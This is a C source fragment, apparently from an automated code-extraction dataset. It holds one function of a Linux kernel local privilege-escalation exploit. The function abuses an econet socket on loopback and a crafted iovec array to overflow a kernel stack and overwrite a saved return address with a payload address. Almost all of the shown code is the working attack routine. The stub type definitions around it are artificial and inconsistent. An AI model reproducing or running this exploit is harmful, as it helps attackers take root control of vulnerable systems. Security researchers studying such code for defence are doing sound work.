#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_ec {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct sockaddr_ec* msg_name; int /*<<< orphan*/  ifr_name; } ;
struct msghdr {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct msghdr* msg_name; int /*<<< orphan*/  ifr_name; } ;
struct iovec {int iov_len; void* iov_base; } ;
struct ifreq {int msg_namelen; int msg_iovlen; struct iovec* msg_iov; scalar_t__ msg_flags; struct ifreq* msg_name; int /*<<< orphan*/  ifr_name; } ;
typedef  int /*<<< orphan*/  ifr ;
typedef  int /*<<< orphan*/  eco_msg ;
typedef  int /*<<< orphan*/  eco_addr ;

/* Variables and functions */
 scalar_t__ EFAULT ; 
 int IOVS ; 
 int /*<<< orphan*/  PF_ECONET ; 
 int /*<<< orphan*/  SIOCSIFADDR ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int STACK_OFFSET ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  exit (int) ; 
 int ioctl (int,int /*<<< orphan*/ ,struct sockaddr_ec*) ; 
 int /*<<< orphan*/  memset (struct sockaddr_ec*,int /*<<< orphan*/ ,int) ; 
 scalar_t__ payload_child ; 
 int /*<<< orphan*/  printf (char*) ; 
 int sendmsg (int,struct sockaddr_ec*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  strcpy (int /*<<< orphan*/ ,char*) ; 

void
do_child_upper(void)
{
	int i, ret, eco_sock;
	struct sockaddr_ec eco_addr;
	struct msghdr eco_msg;
	struct iovec iovs[IOVS];
	struct ifreq ifr;
	char *target;

	/* calculate payload target, skip prologue */
	target = (char *) payload_child;
	target += 4;
	
	/* give lower child a chance to enter its wait4 call */
	sleep(1);

	/* write some zeros */
	for (i = 0; i < STACK_OFFSET; ++i) {
		iovs[i].iov_base = (void *) 0x0;
		iovs[i].iov_len = 0;
	}

	/* overwrite saved ia32_sysret address on stack */
	iovs[STACK_OFFSET].iov_base = (void *) target;
	iovs[STACK_OFFSET].iov_len = 0x0246;

	/* force abort via EFAULT */
	for (i = STACK_OFFSET + 1; i < IOVS; ++i) {
		iovs[i].iov_base = (void *) 0xffffffff00000000;
		iovs[i].iov_len = 0;
	}

	/* create econet socket */
	eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
	if (eco_sock < 0) {
		printf("[-] failed creating econet socket, aborting!\n");
		exit(1);
	}

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");

	/* trick econet into associated with the loopback */
	ret = ioctl(eco_sock, SIOCSIFADDR, &ifr);
	if (ret != 0) {
		printf("[-] failed setting interface address, aborting!\n");
		exit(1);
	}

	memset(&eco_addr, 0, sizeof(eco_addr));
	memset(&eco_msg, 0, sizeof(eco_msg));
	eco_msg.msg_name = &eco_addr;
	eco_msg.msg_namelen = sizeof(eco_addr);
	eco_msg.msg_flags = 0;
	eco_msg.msg_iov = &iovs[0];
	eco_msg.msg_iovlen = IOVS;

	printf("[+] upper child triggering stack overflow...\n");

	/* trigger the kstack overflow into lower child's kstack */
	ret = sendmsg(eco_sock, &eco_msg, 0);
	if (ret != -1 || errno != EFAULT) {
		printf("[-] sendmsg succeeded unexpectedly, aborting!\n");
		exit(1);
	}

	close(eco_sock);
}